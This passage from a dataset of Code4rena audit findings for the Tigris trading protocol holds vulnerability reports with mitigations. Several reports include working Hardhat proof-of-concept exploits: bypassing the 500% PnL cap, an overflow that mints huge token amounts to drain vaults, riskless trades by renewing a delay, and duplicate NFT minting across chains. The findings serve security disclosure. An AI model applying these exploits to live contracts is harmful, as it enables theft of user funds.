_srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168  - Since the transaction was not successful, the message will be added as a failed message. ``` failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload); ``` https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178  - Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows: `lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.  - Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.  - Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.  - He calls the function `retryMessage` to retry the failed message on chain A. https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206  - By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows: `retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`  - Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.   - Now he can for example sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.  - Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.  ***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to both having failed message and being able to mint it at the same time.***  Please note that if this scenario happens again, more NFT with the same token id X will be minted to Bob on different chains.   ## Tools Used  ## Recommended Mitigation Steps It is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to he failed messages to be minted later. ``` mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;      function lzReceive(         uint16 _srcChainId,         bytes memory _srcAddress,         uint64 _nonce,         bytes memory _payload     ) external override {                  require(!consumedMessage[_srcChainId][_srcAddress][_nonce], \"already consumed\");         consumedMessage[_srcChainId][_srcAddress][_nonce] = true;          require(_msgSender() == address(endpoint), \"!Endpoint\");         (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));         // try-catch all errors/exceptions         if (!success) {             failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);             emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);         }     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/125", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-02"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/0x4non-Q.md)."}, {"title": "Bypass the maximum PnL check to take extra profit", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/111", "labels": ["bug", "3 (High Risk)", "disagree with severity", "judge review requested", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "H-04"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L267-L269   # Vulnerability details  ## Impact To protect the fund of vault, the protocol has a security mechanism which limits   ``` Maximum PnL is +500%.  ``` source: https://docs.tigris.trade/protocol/trading-and-fees#limitations  But the implementation is missing to check this limitation while ````addToPosition()````, an attacker can exploit it to get more profit than expected.  ## Proof of Concept The following test case shows both normal case and the exploit scenario. In the normal case,  a 990 USD margin, get back a 500% of 4950 USD payout, and the profit is 3960 USD. In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.  ``` const { expect } = require(\"chai\"); const { deployments, ethers, waffle } = require(\"hardhat\"); const { parseEther, formatEther } = ethers.utils; const { signERC2612Permit } = require('eth-permit'); const exp = require(\"constants\");  describe(\"Design Specification: Maximum PnL is +500%\", function () {    let owner;   let node;   let user;   let node2;   let node3;   let proxy;    let Trading;   let trading;    let TradingExtension;   let tradingExtension;    let TradingLibrary;   let tradinglibrary;    let StableToken;   let stabletoken;    let StableVault;   let stablevault;    let position;    let pairscontract;   let referrals;    let permitSig;   let permitSigUsdc;    let MockDAI;   let mockdai;   let MockUSDC;   let mockusdc;    let badstablevault;    let chainlink;    beforeEach(async function () {     await deployments.fixture(['test']);     [owner, node, user, node2, node3, proxy] = await ethers.getSigners();     StableToken = await deployments.get(\"StableToken\");     stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);     Trading = await deployments.get(\"Trading\");     trading = await ethers.getContractAt(\"Trading\", Trading.address);     await trading.connect(owner).setMaxWinPercent(5e10);     TradingExtension = await deployments.get(\"TradingExtension\");     tradingExtension = await ethers.getContractAt(\"TradingExtension\", TradingExtension.address);     const Position = await deployments.get(\"Position\");     position = await ethers.getContractAt(\"Position\", Position.address);     MockDAI = await deployments.get(\"MockDAI\");     mockdai = await ethers.getContractAt(\"MockERC20\", MockDAI.address);     MockUSDC = await deployments.get(\"MockUSDC\");     mockusdc = await ethers.getContractAt(\"MockERC20\", MockUSDC.address);     const PairsContract = await deployments.get(\"PairsContract\");     pairscontract = await ethers.getContractAt(\"PairsContract\", PairsContract.address);     const Referrals = await deployments.get(\"Referrals\");     referrals = await ethers.getContractAt(\"Referrals\", Referrals.address);     StableVault = await deployments.get(\"StableVault\");     stablevault = await ethers.getContractAt(\"StableVault\", StableVault.address);     await stablevault.connect(owner).listToken(MockDAI.address);     await stablevault.connect(owner).listToken(MockUSDC.address);     await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);     await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(\"1\"));     await tradingExtension.connect(owner).setNode(node.address, true);     await tradingExtension.connect(owner).setNode(node2.address, true);     await tradingExtension.connect(owner).setNode(node3.address, true);     await network.provider.send(\"evm_setNextBlockTimestamp\", [2000000000]);     await network.provider.send(\"evm_mine\");     permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);     permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);      const BadStableVault = await ethers.getContractFactory(\"BadStableVault\");     badstablevault = await BadStableVault.deploy(StableToken.address);      const ChainlinkContract = await ethers.getContractFactory(\"MockChainlinkFeed\");     chainlink = await ChainlinkContract.deploy();      TradingLibrary = await deployments.get(\"TradingLibrary\");     tradinglibrary = await ethers.getContractAt(\"TradingLibrary\", TradingLibrary.address);     await trading.connect(owner).setLimitOrderPriceRange(1e10);   });     describe(\"Bypass the maximum PnL check to take extra profit\", function () {     let orderId;     let closePriceData;     let closeSig;     let initPrice = parseEther(\"1000\");     let closePrice = parseEther(\"2000\");     beforeEach(async function () {       let maxWin = await trading.maxWinPercent();       expect(maxWin.eq(5e10)).to.equal(true);        let TradeInfo = [parseEther(\"1000\"), MockDAI.address, StableVault.address, parseEther(\"10\"), 1, true, parseEther(\"0\"), parseEther(\"0\"), ethers.constants.HashZero];       let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, initPrice, 0, 2000000000, false]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       );              let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];       orderId = await position.getCount();       await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);       expect(await position.assetOpenPositionsLength(1)).to.equal(1);       let trade = await position.trades(orderId);       let marginAfterFee = trade.margin;       expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);        // Some time later       await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001000]);       await network.provider.send(\"evm_mine\");              // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900       closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001000, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );      });      it.only(\"All profit is $9900, close the order normally, only get $3960 profit\", async function () {       let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther(\"990\");       let payout = balanceAfter.sub(balanceBefore);       expect(payout.eq(parseEther(\"4950\"))).to.be.true;        let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);       expect(profit.eq(parseEther(\"3960\"))).to.be.true;      });      it.only(\"All profit is $9900, bypass the PnL check to take extra $2600 profit\", async function () {       // We increase the possition first rather than closing the profit order directly       let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];       let extraMargin = parseEther(\"1000\");       await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);        // 60 secs later       await network.provider.send(\"evm_setNextBlockTimestamp\", [2000001060]);       await network.provider.send(\"evm_mine\");          // Now we close the order to take all profit       closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];       let closeMessage = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [node.address, 1, closePrice, 0, 2000001060, false]         )       );       closeSig = await node.signMessage(         Buffer.from(closeMessage.substring(2), 'hex')       );        let balanceBefore = await stabletoken.balanceOf(owner.address);       await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);       let balanceAfter = await stabletoken.balanceOf(owner.address);       let marginAfterFee = parseEther(\"990\").add(extraMargin.mul(990).div(1000));       let originalProfit = parseEther(\"3960\");       let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);       expect(extraProfit.gt(parseEther('2600'))).to.be.true;     });    }); });   ```  The test result ```  Design Specification: Maximum PnL is +500%     Bypass the maximum PnL check to take extra profit       \u221a All profit is $9900, close the order normally, only get $3960 profit       \u221a All profit is $9900, bypass the PnL check to take extra $2600 profit ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Add a check for ````addToPosition()```` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit."}, {"title": "Must approve 0 first", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117   # Vulnerability details  ## Impact Some tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved.   ## Proof of Concept https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L117  ```solidity     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);// @audit this could fail always with some tokens,              bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }     } ```  ## Tools Used manual revision  ## Recommended Mitigation Steps    Add an approve(0) before approving; ```     function claimGovFees() public {         address[] memory assets = bondNFT.getAssets();          for (uint i=0; i < assets.length; i++) {             uint balanceBefore = IERC20(assets[i]).balanceOf(address(this));             IGovNFT(govNFT).claim(assets[i]);             uint balanceAfter = IERC20(assets[i]).balanceOf(address(this));             IERC20(assets[i]).approve(address(bondNFT), 0);             IERC20(assets[i]).approve(address(bondNFT), type(uint256).max);             bondNFT.distribute(assets[i], balanceAfter - balanceBefore);         }   } ```      "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/96", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-01"], "target": "2022-12-tigris-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-12-tigris-findings/blob/main/data/chrisdior4-Q.md)."}, {"title": "Certain fee configuration enables vaults to be drained", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/86", "labels": ["bug", "3 (High Risk)", "selected for report", "sponsor confirmed", "H-03"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/utils/TradingLibrary.sol#L46   # Vulnerability details  # Certain fee configuration enables vaults to be drained  ### Summary An overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.   ### Detailed exploit process description When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.  The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.  The next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.  The order is then immediately executed through `executeLimitOrder()`. The final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.   ### Detailed bug description The bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC). Line 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.  Later, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.   ### Recommended mitigation The core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe(\"PoC\", function () {     it.only(\"PoC\", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))       await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))       const permitData = [         \"0\",         \"0\",         \"0\",         \"0x0000000000000000000000000000000000000000000000000000000000000000\",         \"0x0000000000000000000000000000000000000000000000000000000000000000\",         false       ]        // Create referral code       await referrals.connect(user).createReferralCode(ethers.constants.HashZero)        // Set the fees       await trading.connect(owner).setFees(         false,        // close         \"200000000\",  // dao           \"0\",          // burn         \"100000000\",  // referral         \"0\",          // bot         \"0\",          // percent       )         // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther(\"1\"),          // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther(\"2\"),          // leverage         0,                        // asset id         false,                    // direction (short)         \"115792089237316195423570985008687907854269984665640564039467\",          // take profit price         parseEther(\"0\"),       // stop loss price         ethers.constants.HashZero // referral (ourself)       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther(\"1000\"),   // price         permitData,           // permit         user.address          // trader       )         // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send(\"evm_increaseTime\", [10])       await network.provider.send(\"evm_mine\")        // Create the price data       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther(\"1000\"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send(\"evm_increaseTime\", [10])       await network.provider.send(\"evm_mine\")        // Close order       await trading.connect(user).limitClose(         1,          // id         true,       // take profit         priceData,  // price data         sig,        // signature       )        // Print results       const amount = await stabletoken.balanceOf(user.address)       const tenPow18 = \"1000000000000000000\"       console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)     }) }) ```"}, {"title": "Lock.sol: claimGovFees function can cause assets to be stuck in the Lock contract", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/73", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-01"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110 https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215   # Vulnerability details  ## Impact When calling `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)), assets that are set to be not allowed or assets that don't have any shares yet in the `BondNFT` contract will cause a silent failure in `BondNFT.distribute` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L215)).   The funds from the `GovNFT` contract will get transferred into the `Lock` contract and then will be stuck there. They cannot be recovered.    ## Proof of Concept 1. An asset is added to the `BondNFT` contract by calling `BondNFT.addAsset` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L349)) 2. There are no bonds yet for this asset so the amount of shares for the asset is zero 3. `Lock.claimGovFees` ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L110)) is called 4. Funds are transferred from the `GovNFT` contract to the `Lock` contract ([https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115](https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L115)) 5. The call to `BondNFT.distribute` now fails quietly without reverting the transaction:      ```solidity     if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return;    ``` 6. The funds are now stuck in the `Lock` contract. They cannot be recovered.  ## Tools Used VSCode  ## Recommended Mitigation Steps A naive solution would be to use `revert` instead of `return` in `BondNFT.distribute` such that funds are either transferred from `GovNFT` to `Lock` and then to `BondNFT` or not at all.    ```solidity      ) external { -        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) return; +        if (totalShares[_tigAsset] == 0 || !allowedAsset[_tigAsset]) revert;          IERC20(_tigAsset).transferFrom(_msgSender(), address(this), _amount);          unchecked {              uint aEpoch = block.timestamp / DAY; ```  This however is an incomplete fix because if there is a single \"bad\" asset, rewards for the other assets cannot be distributed either.    Moreover functions like `Lock.lock` and `Lock.release` rely on `Lock.claimGovFees` to not revert.    So you might allow the owner to rescue stuck tokens from the `Lock` contract. Of course only allow rescuing the balance of the `Lock` contract minus the `totalLocked` of the asset in the `Lock` contract such that the locked amount cannot be rescued.  "}, {"title": "Riskless trades due to delay check", "html_url": "https://github.com/code-423n4/2022-12-tigris-findings/issues/67", "labels": ["bug", "3 (High Risk)", "primary issue", "selected for report", "sponsor confirmed", "H-02"], "target": "2022-12-tigris-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L573   # Vulnerability details  # Riskless trades due to delay check  ### Summary `Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.   ### Detailed description A malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.  The exploit is based on three principles: 1. The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()` 2. Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()` 3. The block delay can be continuously renewed for a negligible cost  **Based on these three principles, the following method can be used to perform riskless trades:** Assuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.  After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *[1]*, which will renew the delay and thus stops `limitClose` from being called.  While the trader keeps renewing the delay to stop his position from being closed, he watches the price development: - If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again. - If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.  The trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.   *Notes* *[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.  ### Recommended mitigation The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.    ### PoC Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`: ```javascript describe(\"PoC\", function () {     it.only(\"PoC\", async function () {       // Setup token balances and approvals       const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)       await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))       await mockDAI.connect(owner).transfer(stablevault.address, parseEther(\"100000\"))       await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))       const daiAtBeginning = await mockDAI.balanceOf(user.address)       const permitData = [         \"0\",         \"0\",         \"0\",         \"0x0000000000000000000000000000000000000000000000000000000000000000\",         \"0x0000000000000000000000000000000000000000000000000000000000000000\",         false       ]        // Setup block delay to 5 blocks       const blockDelay = 5;       await trading.connect(owner).setBlockDelay(blockDelay)           // ============================================================== //       // =================== Create the limit order =================== //       // ============================================================== //       const tradeInfo = [         parseEther(\"9000\"),       // margin amount         MockDAI.address,          // margin asset         StableVault.address,      // stable vault         parseEther(\"2\"),          // leverage         0,                        // asset id         true,                     // direction (long)         parseEther(\"0\"),          // take profit price         parseEther(\"1000\"),       // stop loss price         ethers.constants.HashZero // referral       ];        // Create the order       await trading.connect(user).initiateLimitOrder(         tradeInfo,            // trade info         1,                    // order type (limit)         parseEther(\"1000\"),   // price         permitData,           // permit         user.address          // trader       )          // ============================================================== //       // =================== Execute the limit order ================== //       // ============================================================== //        // Wait for some blocks to pass the delay       await network.provider.send(\"evm_increaseTime\", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send(\"evm_mine\")       }        // Create the price data (the price hasn't changed)       let priceData = [         node.address,                                   // provider         0,                                              // asset id         parseEther(\"1000\"),                             // price         10000000,                                       // spread (0.1%)         (await ethers.provider.getBlock()).timestamp,   // timestamp         false                                           // is closed       ]        // Sign the price data       let message = ethers.utils.keccak256(         ethers.utils.defaultAbiCoder.encode(           ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],           [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]         )       );       let sig = await node.signMessage(         Buffer.from(message.substring(2), 'hex')       )        // Execute the limit order       await trading.connect(user).executeLimitOrder(1, priceData, sig);             // ============================================================== //       // ================== Block bots from closing =================== //       // ============================================================== //        for (let i = 0; i < 5; i++) {          /*           This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.           We constantly add 1 wei to the position when the delay is close to running out.           This won't change anything about our position, but it will reset the delay timer,           stopping bots from calling `limitClose()`.             This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.           And if the price rises, we can push the stop loss higher to keep profits.            The loop runs five times just to demonstrate. In reality, this could be done as long as needed.         */           // Blocks advanced to one block before the delay would pass         await network.provider.send(\"evm_increaseTime\", [10])         for (let n = 0; n < blockDelay - 1; n++) {           await network.provider.send(\"evm_mine\")         }             // ============================================================== //         // =========== Add 1 wei to position (price is down)  =========== //         // ============================================================== //          // Increase delay by calling addToPosition with 1 wei         // Create the price data         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther(\"900\"),                              // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]          // Sign the price data -          message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Add to position         await trading.connect(user).addToPosition(           1,           \"1\",           priceData,           sig,           stablevault.address,           MockDAI.address,           permitData,           user.address,         )            // ============================================================== //         // ====================== Bots cannot close ===================== //         // ============================================================== //          // Bots cannot close the position even if the price is down below the stop loss         await expect(trading.connect(user).limitClose(           1,          // id           false,      // take profit           priceData,  // price data           sig,        // signature         )).to.be.revertedWith(\"0\") // checkDelay          // They can also not liquidate the position because the price is not down enough         // If the price falls close to the liquidation zone, we can add more margin or simply close         // the position, netting us the stop-loss price.         await expect(trading.connect(user).liquidatePosition(           1,          // id           priceData,  // price data           sig,        // signature         )).to.be.reverted             // ============================================================== //         // =============== Increase SL when price is up  ================ //         // ============================================================== //          // Sign the price data (price has 5x'ed from initial price)         priceData = [           node.address,                                   // provider           0,                                              // asset id           parseEther(\"5000\"),                             // price           10000000,                                       // spread (0.1%)           (await ethers.provider.getBlock()).timestamp,   // timestamp           false                                           // is closed         ]         message = ethers.utils.keccak256(           ethers.utils.defaultAbiCoder.encode(             ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],             [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]           )         );         sig = await node.signMessage(           Buffer.from(message.substring(2), 'hex')         )          // Update stop loss right at the current price         await trading.connect(user).updateTpSl(           false,                // type (sl)           1,                    // id           parseEther(\"5000\"),   // sl price           priceData,            // price data           sig,                  // signature           user.address,        // trader         )       }            // ============================================================== //       // ======================== Close order  ======================== //       // ============================================================== //        // When we are happy with the profit, we stop increasing the delay and close the position        // Wait for some blocks to pass the delay       await network.provider.send(\"evm_increaseTime\", [10])       for (let n = 0; n < blockDelay; n++) {         await network.provider.send(\"evm_mine\")       }        // Close order       await trading.connect(user).limitClose(         1,          // id         false,      // take profit         priceData,  // price data         sig,        // signature       )        // Withdraw to DAI       const amount = await stabletoken.balanceOf(user.address)       await stablevault.connect(user).withdraw(MockDAI.address, amount)        // Print results       const daiAtEnd = await mockDAI.balanceOf(user.address)       const tenPow18 = \"1000000000000000000\"       const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18       console.log(`Profit: ${diff} DAI`)     }) }) ```"}, {"title": "Lock.sol: assets deposited with Lock.extendLock function are 